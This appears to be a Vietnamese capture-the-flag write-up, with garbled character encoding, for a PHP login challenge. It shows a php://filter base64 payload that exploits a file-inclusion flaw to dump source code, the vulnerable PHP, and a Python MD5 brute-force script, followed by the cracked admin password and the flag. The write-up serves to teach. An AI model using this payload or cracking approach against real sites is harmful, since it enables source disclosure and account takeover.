#L0g1n - ASCIS

link bÃ i: http://27.32.87.34.bc.googleusercontent.com

Gá»£i Ã½: KhÃ´ng cÃ³

Kiáº¿n thá»©c:
- Path Traversal
- PHP Wrappers and Protocols
- Hash md5

Khi vÃ o link nÃ y thÃ¬ nÃ³ redirect sang trang nÃ y. Há»«mmm

http://27.32.87.34.bc.googleusercontent.com/?page=home

![](./img/home.png?raw=true)
Äáº§u tiÃªn mÃ¬nh nghÄ© tá»›i viá»‡c dÃ¹ng Path traversal.

![](./img/url_traversal.png?raw=true)

No thing is here.
Thá»­ má»™t vÃ i cÃ¡i ná»¯a váº«n khÃ´ng cÃ³ gÃ¬ xáº£y ra.

ThÃ´i thÃ¬ thá»­ dÃ¹ng PHP Wrappers and Protocols
cho tham sá»‘ page=php://filter/read/convert.base64-encode/resource=home

![](./img/base64_home.png?raw=true)

Ãi chÃ  chÃ . Tao cÃ³ Ä‘Æ°á»£c mÃ£ base64 cá»§a trang home.php.

Giá» dÃ¹ng base64 decode thÃ´i.
![](./img/base64_home_terminal.png?raw=true)

LÃºc vÃ o web Ä‘á»ƒ xem thÃ¬ ta biáº¿t Ä‘Æ°á»£c nÃ³ cÃ³ 3 trang: home, login, register vá»›i trang index ná»¯a.
Giá» tao láº¥y háº¿t source code cá»§a nÃ³.

Ta chÃº Ã½ cÃ¡c Ä‘oáº¡n source sau
-Trong file index:
```php
    if(isset($_GET["page"]) && !empty($_GET["page"]))
  {
    if( strpos(strtolower($_GET["page"]), "secret") !== false)
      {
        die("<font color='red' size='5'>(ï¿£^ï¿£)ã‚ Hi Comrade, Something Wrong!</font>");
      }
    include($_GET["page"].".php");
  }
  else
  {
    header("Location: ?page=home");
  }
```
- Trong file home:
```php
<?php 
			include('secret.php');
			echo '<h3>';
			if(isset($_SESSION['user']) && $_SESSION['user']==="admin")
			{
				print("Oops, Admin? Here your flag...<br><font color='red'>( ãƒ-_-)ãƒ ( ãƒ-_-)ãƒ</font><font color='white'> $flag </font><font color='red'>ãƒ¾(^-^ãƒ½)ãƒ¾(^-^ãƒ½)</font>");
			}
			else
			{
				print("Hello, it looks like you haven't logged in yet, please <a href='?page=login'>L0g1n</a><br><br><font color='green'>!!(ï¾’ï¿£ ï¿£)_Î¸â˜†Â°0Â°)/</font> <font color='blue'>(`âŒ’*)O-(`âŒ’Â´Q)</font> <font color='red'>(Â¬_Â¬'')Ô…(ï¿£Îµï¿£Ô…)</font>");
			}
			echo '</h3>';
		?>

```

-Trong file login.php

```php
if(isset($_POST["username"]) && !empty($_POST["username"]) && isset($_POST["password"]) && !empty($_POST["password"]) && isset($_POST["token"]))
{
	if($_SESSION["form_token"]===$_POST["token"])
	{
  		unset($_SESSION['form_token']);
  		$_SESSION["form_token"] = md5(uniqid(rand(), true));
  		if ($_POST["username"] === "admin" && md5($_POST["password"]) === "c3cef6586e2e5705d9ed18ba8f4346c0")
        {
  			$_SESSION['user'] = "admin";
  			print("Ok... Have a good day!");
  		}
  		else if ($_POST["username"] === "admin") 
  		{
  			print("Wrong Password, <font color='red'>(â•¯Â°-Â°)â•¯</font><font color='brown'>å½¡â”»â”â”»</font>");
  		}
  		else
  		{
  			print("Wrong Username/Password<br><font color='blue'>â€¿ï¸µâ€¿ï¸µâ€¿ï¸µâ€¿</font><font color='red'>ãƒ½(Â°â–¡Â° )ãƒ</font><font color='blue'>ï¸µâ€¿ï¸µâ€¿ï¸µâ€¿ï¸µ</font>");
  		}
	}
}
else 
{
	print("Hello, Login here <font color='green'>ï¼¼(ï¼¾â–½ï¼¾)ï¼</font>");
}

```

VÃ  cuá»‘i cÃ¹ng lÃ  file register.php

```php
<?php
if (!defined('check_access')) 
{
        die("<font color='red' size='5'>(ï¿£^ï¿£)ã‚ Hi Comrade, Something Wrong!</font>");
}
?>
<html>
	<title> L0g1n </title>
	<body>
		<h1><font color="purple">ğŸ”— Register (Under maintenance)</font></h1>

<?php

echo '<h3>';

if(isset($_POST["username"]) && !empty($_POST["username"]) && isset($_POST["password"]) && !empty($_POST["password"]))
{
	if($_POST["username"] === "admin") 
	{
		print("<font color='red'>(ã£â€¢ï¹â€¢)ã£</font> User already exists ");
	}
	else
	{
		print("Our register service is under maintenance so please come back later.<br><font color='blue'>ãƒ¾(âŒâ– _â– )ãƒâ™ª</font>");
	}
}

echo '</h3>';

?>
<form action="?page=register" method="POST">
		<br><strong>USERNAME</strong><br> <input disabled type="text" title="Something very wrong!!!" pattern="[a-z0-9]{4,10}" name="username"/><br>
		<strong>PASSWORD</strong><br> <input disabled type="password" title="Something very wrong!!!" pattern="[a-h0-9]{4,7}" name="password" /><br>
		<strong>ADDRESS</strong><br> <input disabled type="address" name="address"> (Optional)<br><br>
		<button type="submit" class="button1">Register</button>
		</form>
	</body>
</html>

```
Äáº§u tiÃªn lÃ  file index.php
![](./img/index_php.png?raw=true)
CÃ³ láº½ chá»‰ cáº§n bypass qua Ä‘Æ°á»£c cÃ¡i strpos vÃ  strtolower lÃ  cÃ³ thá»ƒ láº¥y Ä‘Æ°á»£c source cá»§a file secret.php (nÆ¡i chá»©a flag)
NhÆ°ng ráº¥t tiáº¿c, sau má»™t Ä‘á»‘ng thá»i gian tÃ¬m vÃ  thá»­ => No hope :(

Trong file home.php
![](./img/home_php.png?raw=true)
Trong nÃ y cháº£ cÃ³ gÃ¬ nhiá»u. Ta chá»‰ biáº¿t Ä‘Æ°á»£c lÃ  Ä‘Äƒng nháº­p báº±ng admin Ä‘Æ°á»£c thÃ¬ cÃ³ flag thÃ´i.

Tiáº¿p theo lÃ  trong file register.php
![](./img/register_php.png?raw=true)
Trong nÃ y ta chá»‰ nÃªn chÃº Ã½ má»™t Ä‘oáº¡n lÃ  Ä‘oáº¡n nháº­p form
Username vÃ  password Ä‘Æ°á»£c pattern trong khoáº£ng tá»« a-h vÃ  tá»« 0-9 vá»›i Ä‘á»™ dÃ i trong khoáº£ng 4-7.
KhÃ´ng biáº¿t ban tá»• chá»©c cÃ³ lá»«a mÃ¬nh khÃ´ng. NhÆ°ng mong lÃ  password cá»§a admin cÅ©ng thá»a mÃ£n Ä‘iá»u kiá»‡n nÃ y Ä‘á»ƒ bruce force.
  
Tiáº¿p theo lÃ  trong file login.php
![](./img/login_php.png?raw=true)
Ãši chÃ , cÃ³ Ä‘Æ°á»£c password sau khi md5 lÃ  'c3cef6586e2e5705d9ed18ba8f4346c0' luÃ´n. Giá» decrypto cÃ¡i password cháº¯c ra Ä‘Æ°á»£c máº­t kháº©u.
MÃ¬nh code má»™t Ä‘oáº¡n Ä‘á»ƒ "chÃ³ ngÃ¡p pháº£i ruá»“i" thÃ´i. Cháº¡y mÃ  lÃ²ng mong BTC khÃ´ng lá»«a mÃ¬nh.

```python
import hashlib 
import secrets
res = "c3cef6586e2e5705d9ed18ba8f4346c0"
while True:
    password = ''.join(secrets.choice('abcdefgh0123456789') for i in range(7))
    result = hashlib.md5(bytes(password,encoding='utf-8'))
    if(res == result.hexdigest()):
        print(password + ": True")
        break
    else:
        print(password + ": False")
```

Cháº¡y má»™t há»“i thÃ¬ ra Ä‘Æ°á»£c password lÃ  143b4b3



VÃ o trang login submit vá»›i username = admin vÃ  password = 143b4b3 thÃ´iiii.
![](./img/logged_in.png?raw=true)

VÃ o láº¡i home:

![](./img/flag.png?raw=true)

Flag:  ASCIS{__Hav3_Y0u_Heard_Ab0ut__HTML_PATT3rN?_} 

KhÃ¡ toang. Anyway, THIS IS THE ENDGAME!!!!
